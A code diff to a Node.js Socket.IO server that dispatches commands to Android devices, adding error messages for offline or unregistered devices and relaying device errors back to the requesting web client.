@@ -709,7 +709,34 @@ io.on("connection", (socket) => {
             }
         }
 
+        if (!dispatched) {
+            let reason = "Device is offline (no background socket connected)";
+            if (!target) {
+                reason = "Device not registered on server (app has never connected)";
+            } else if (!target.sockets || target.sockets.size === 0) {
+                reason = "Device is offline (phone app closed or background service not running)";
+            }
+            socket.emit("device-error", {
+                targetDeviceId,
+                command,
+                error: reason
+            });
+        }
+
         socket.emit("auto-command-dispatched", { command, targetDeviceId, success: dispatched });
+    });
+
+    // Relay device errors from Android companion/background service to requesting web client
+    socket.on("device-error", (data) => {
+        try {
+            console.warn("device-error relayed from socket:", data);
+            const targetSocketId = data && data.targetSocketId;
+            if (targetSocketId) {
+                io.to(targetSocketId).emit("device-error", data);
+            } else {
+                socket.broadcast.emit("device-error", data);
+            }
+        } catch (e) {}
     });
 
     socket.on("gallery-chunk", (data) => {
